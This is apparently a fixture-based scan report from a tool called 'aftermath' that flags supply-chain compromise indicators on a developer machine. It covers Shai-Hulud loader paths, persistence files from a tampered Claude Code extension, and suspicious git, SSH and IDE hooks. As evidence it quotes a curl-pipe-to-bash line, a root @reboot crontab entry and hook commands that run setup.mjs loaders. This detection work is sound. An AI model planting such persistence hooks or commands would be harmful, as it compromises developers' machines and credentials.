# aftermath 0.1.0

- scanned: `2026-11-20T12:00:00Z`
- home: `/home/dev`
- platform: `linux`
- findings: 24 (critical 14, high 3, medium 3, low 1, info 3)

## CRITICAL: Shai-Hulud payload path .claude/execution.js

- collector: `ioc`
- rule: `shai-hulud-execution-js`
- path: `/home/dev/.claude/execution.js`
- source: https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared
- description: StepSecurity lists .claude/execution.js as the payload copy committed into repositories. A file you created at this path also matches.
- evidence: `path exists; contents not displayed`

## CRITICAL: Shai-Hulud payload path .claude/router_runtime.js

- collector: `ioc`
- rule: `shai-hulud-router-runtime`
- path: `/home/dev/.claude/router_runtime.js`
- source: https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/
- description: Microsoft's Shai-Hulud 2.0 note lists .claude/router_runtime.js as a payload copy written next to the Claude SessionStart hook.
- evidence: `path exists; contents not displayed`

## CRITICAL: Claude settings SessionStart hook runs node .vscode/setup.mjs

- collector: `ioc`
- rule: `shai-hulud-claude-hook`
- path: `/home/dev/.claude/settings.json`
- source: https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared
- description: The same StepSecurity writeup describes .claude/settings.json with a SessionStart hook whose command is node .vscode/setup.mjs.
- evidence: `matched "node .vscode/setup.mjs"`

## CRITICAL: Shai-Hulud loader path setup.mjs under .claude or .vscode

- collector: `ioc`
- rule: `shai-hulud-setup-mjs`
- path: `/home/dev/.claude/setup.mjs`
- source: https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared
- description: StepSecurity and Microsoft describe setup.mjs written to .claude and .vscode as the loader those IDE hooks execute.
- evidence: `path exists; contents not displayed`

## CRITICAL: Persistence file from the tampered Claude Code extension

- collector: `ioc`
- rule: `cursor-claude-ext-smt-files`
- path: `/home/dev/.config/.smt`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The same notice lists ~/.config/.smt and ~/.config/.smtk on Linux and macOS, and %USERPROFILE%\.config\smt.cmd and smtk on Windows. File contents are not read or displayed.
- evidence: `path exists; contents not displayed`

## CRITICAL: Persistence file from the tampered Claude Code extension

- collector: `ioc`
- rule: `cursor-claude-ext-smt-files`
- path: `/home/dev/.config/.smtk`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The same notice lists ~/.config/.smt and ~/.config/.smtk on Linux and macOS, and %USERPROFILE%\.config\smt.cmd and smtk on Windows. File contents are not read or displayed.
- evidence: `path exists; contents not displayed`

## CRITICAL: SSH authorized_keys matches the tampered Claude Code extension

- collector: `ioc`
- rule: `cursor-claude-ext-ssh-key`
- path: `/home/dev/.ssh/authorized_keys`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: Cursor reported that marketplace copies of Anthropic.claude-code 2.1.312 and 2.1.313 appended an ssh-ed25519 key whose comment is svc-telemetry. The key material below is the public key from that notice.
- evidence: `matched published indicator material`

## CRITICAL: Shai-Hulud loader path setup.mjs under .claude or .vscode

- collector: `ioc`
- rule: `shai-hulud-setup-mjs`
- path: `/home/dev/.vscode/setup.mjs`
- source: https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared
- description: StepSecurity and Microsoft describe setup.mjs written to .claude and .vscode as the loader those IDE hooks execute.
- evidence: `path exists; contents not displayed`

## CRITICAL: VS Code task runs node .claude/setup.mjs

- collector: `ioc`
- rule: `shai-hulud-vscode-task`
- path: `/home/dev/.vscode/tasks.json`
- source: https://www.stepsecurity.io/blog/a-mini-shai-hulud-has-appeared
- description: StepSecurity described a Shai-Hulud wave that commits .vscode/tasks.json with a folderOpen task whose command is node .claude/setup.mjs.
- evidence: `matched "node .claude/setup.mjs"`

## CRITICAL: Startup script sysmon.cmd from the tampered Claude Code extension

- collector: `ioc`
- rule: `cursor-claude-ext-startup-sysmon`
- path: `/home/dev/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The notice names the Windows fallback %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\sysmon.cmd.
- evidence: `path exists; contents not displayed`

## CRITICAL: LaunchAgent com.apple.sysmond.plist from the tampered Claude Code extension

- collector: `ioc`
- rule: `cursor-claude-ext-launchagent`
- path: `/home/dev/Library/LaunchAgents/com.apple.sysmond.plist`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The notice names ~/Library/LaunchAgents/com.apple.sysmond.plist (label com.apple.sysmond) as the macOS persistence plist.
- evidence: `path exists; contents not displayed`

## CRITICAL: Scheduled task SysMon from the tampered Claude Code extension

- collector: `ioc`
- rule: `cursor-claude-ext-task-sysmon`
- path: `/system/Windows/System32/Tasks/SysMon`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The notice names a scheduled task SysMon. This matches the task file at Windows\System32\Tasks\SysMon. A legitimate task with the same name would also match.
- evidence: `path exists; contents not displayed`

## CRITICAL: Crontab command references .config/.smt

- collector: `ioc`
- rule: `cursor-claude-ext-cron-smt`
- path: `/system/etc/crontab`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The notice describes a Linux @reboot crontab entry that runs .config/.smt. The matched text is the published path fragment, not a copy of the script.
- evidence: `matched ".config/.smt"`

## CRITICAL: Temp file name .stk_ plus 10 hex characters

- collector: `ioc`
- rule: `cursor-claude-ext-stk-temp`
- path: `/temp/.stk_0123abcdef`
- source: https://cursor.com/blog/claude-code-extension-security-notice
- description: The notice names /tmp/.stk_<10 hex>, $TMPDIR/.stk_<10 hex>, and %TEMP%\.stk_<10 hex> as SSH identity files. Contents are not read.
- evidence: `temp file name matched; contents not read`

## HIGH: core.hooksPath is set

- collector: `git`
- rule: `git.hooksPath`
- path: `/home/dev/.gitconfig:4`
- description: Git runs hooks from this directory on every repository command that uses hooks.
- evidence: `core.hooksPath=.git-hooks`

## HIGH: download or decode piped to a shell

- collector: `shell`
- rule: `shell.suspicious`
- path: `/home/dev/.bashrc:4`
- description: Matched a shell startup line. Common toolchain PATH prefixes are not reported.
- evidence: `curl -fsSL https://example.invalid/setup.sh | bash`

## HIGH: SSH authorized key forces a command

- collector: `ssh`
- rule: `ssh.command`
- path: `/home/dev/.ssh/authorized_keys:2`
- description: Public key material is not included. The fingerprint is SHA256 of the key blob.
- evidence: `ssh-ed25519 SHA256:0Z6R+DF64Do2nwQic8a7kkfDLNNk4IiK+2U2Rci4htk comment=svc-telemetry options=command="echo aftermath-fixture",restrict`

## MEDIUM: claude hook command

- collector: `aiide`
- rule: `ide.hook`
- path: `/home/dev/.claude/settings.json`
- description: The command was not executed.
- evidence: `node .vscode/setup.mjs`

## MEDIUM: vscode task runs on folder open

- collector: `aiide`
- rule: `ide.task`
- path: `/home/dev/.vscode/tasks.json`
- description: The command was not executed.
- evidence: `Environment Setup: node .claude/setup.mjs`

## MEDIUM: npm auth token is present

- collector: `pkg`
- rule: `pkg.token`
- path: `/home/dev/.npmrc:2`
- description: Tokens on a machine involved in an incident should be rotated.
- evidence: `key=_authToken host=registry.npmjs.org; rotate if this machine was involved in an incident`

## LOW: git URL rewrite to a known host

- collector: `git`
- rule: `git.insteadOf`
- path: `/home/dev/.gitconfig:6`
- description: Git rewrites URLs that start with the insteadOf prefix so they start with the section URL.
- evidence: `base=git@github.com: insteadOf=https://github.com/`

## INFO: system crontab entry

- collector: `autorun`
- rule: `autorun.cron`
- path: `/system/etc/crontab`
- description: The entry was not started.
- evidence: `@reboot user=root /bin/sh "$HOME/.config/.smt"`

## INFO: credential helper

- collector: `git`
- rule: `git.credential`
- path: `/home/dev/.gitconfig:2`
- evidence: `credential.helper=osxkeychain`

## INFO: SSH authorized key

- collector: `ssh`
- rule: `ssh.key`
- path: `/home/dev/.ssh/authorized_keys:1`
- description: Public key material is not included. The fingerprint is SHA256 of the key blob.
- evidence: `ssh-ed25519 SHA256:cJ6AyISHokEeHuTfufIqhhSS0gxHZRUMDHlKvXD4FHw comment=dev-laptop options=none`

